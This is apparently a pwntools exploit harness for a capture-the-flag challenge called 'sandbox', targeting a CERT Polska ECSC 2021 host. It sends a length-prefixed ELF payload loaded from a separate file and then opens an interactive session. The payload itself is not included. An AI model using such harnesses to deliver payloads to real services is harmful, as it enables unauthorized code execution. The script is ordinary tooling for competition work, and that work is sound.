from pwn import *

elf = ELF('./sandbox')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *run_sandbox+173",
		"c",
	]))
elif args.REMOTE:
	p = remote("ecsc21.hack.cert.pl", 25732)
else:
	p = process(elf.path) 


with open("./payload", "rb") as f:
	payload = f.read()

p.sendafter(b"[+] Reading ELF\n", p32(len(payload)) + payload)
p.interactive()
